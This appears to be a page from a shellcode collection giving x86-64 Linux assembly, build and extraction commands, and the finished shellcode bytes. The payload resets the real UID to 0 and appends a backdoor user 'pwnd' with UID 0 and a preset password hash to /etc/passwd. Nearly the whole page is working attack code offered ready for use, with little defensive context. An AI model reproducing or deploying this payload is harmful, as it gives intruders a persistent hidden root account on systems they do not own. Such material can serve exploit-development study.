---
layout: default
title: Set Real-UID to 0 and add new root user to /etc/passwd with password
permalink: /shellcode/asm-15.html
os: Linux
arch: Intel x86-64
length: 141
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
; Writes new user 'pwnd' to /etc/passwd with the password '1a2b3c4d'
; Generate hash with perl: perl -le 'print crypt("1a2b3c4d", "root")'
; Line to write: 'pwnd:roXZRtEhJnId2:0:0::/root:/bin/bash\n'

section .text
global _start

_start:
	xor rbx, rbx			; null rbx (0)
    	mul rbx                     	; rax, rbx, rdx = 0
	xor rdi, rdi			; null rdi (0)
	xor rsi, rsi			; null rsi (0)

	mov al, 0x71			; move setreuid syscall number into al (rax)
	syscall				; call setreuid

	push rbx			; push null terminator
	mov rbx, 0x6477737361702f2f	; move "//passwd" into rbx
	push rbx			; push "//passwd"
	mov rbx, 0x2f6374652f2f2f2f	; move "////etc/" into rbx
	push rbx			; push "////etc/"

	mov rdi, rsp			; move pointer to "////etc//passwd" into rdi
	mov si, 0x401			; move 0x401 (WRITE ONLY | APPEND) into si (rsi)
	mov al, 0x02			; move open syscall number into al (rax)
	syscall				; call open

	mov rdi, rax			; move file-descriptor into rdi

	xor rbx, rbx			; null rbx (0)
	mul rbx				; rax, rbx, rdx = 0

	push rbx			; push null terminator
	mov rbx, 0x0a687361622f6e69	; move "in/bash\n" into rbx
	push rbx			; push "in/bash\n"
	mov rbx, 0x622f3a746f6f722f	; move "/root:/b" into rbx
	push rbx			; push "/root:/b"
	mov rbx, 0x3a3a303a303a3264	; move "d2:0:0::" into rbx
	push rbx			; push "d2:0:0::"
	mov rbx, 0x496e4a684574525a	; move "ZRtEhJnI" into rbx
	push rbx			; push "ZRtEhJnI"
	mov rbx, 0x586f723a646e7770	; move "pwnd:roX" into rbx
	push rbx			; push "pwnd:roX"

	mov rsi, rsp			; move pointer to new user string into rdi
	mov dl, 40			; move 40 (bytes) into dl (rdx)
	mov al, 0x01			; move write syscall number into al (rax)
	syscall				; call write

	xor rax, rax			; null rax (0)
	mov al, 0x03			; move close syscall num into al (rax)
	syscall 			; call close

	xor rax, rax			; null rax (0)
	xor rdi, rdi			; null rdi (0)
	mov al, 0x3c			; move exit syscall number into al (rax)
	syscall				; call exit
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x48\x31\xdb\x48\xf7\xe3\x48\x31\xff\x48\x31\xf6\xb0\x71\x0f\x05\x53\x48\xbb\x2f\x2f\x70\x61\x73\x73\x77\x64\x53\x48\xbb\x2f\x2f\x2f\x2f\x65\x74\x63\x2f\x53\x48\x89\xe7\x66\xbe\x01\x04\xb0\x02\x0f\x05\x48\x89\xc7\x48\x31\xdb\x48\xf7\xe3\x53\x48\xbb\x69\x6e\x2f\x62\x61\x73\x68\x0a\x53\x48\xbb\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x53\x48\xbb\x64\x32\x3a\x30\x3a\x30\x3a\x3a\x53\x48\xbb\x5a\x52\x74\x45\x68\x4a\x6e\x49\x53\x48\xbb\x70\x77\x6e\x64\x3a\x72\x6f\x58\x53\x48\x89\xe6\xb2\x28\xb0\x01\x0f\x05\x48\x31\xc0\xb0\x03\x0f\x05\x48\x31\xc0\x48\x31\xff\xb0\x3c\x0f\x05
```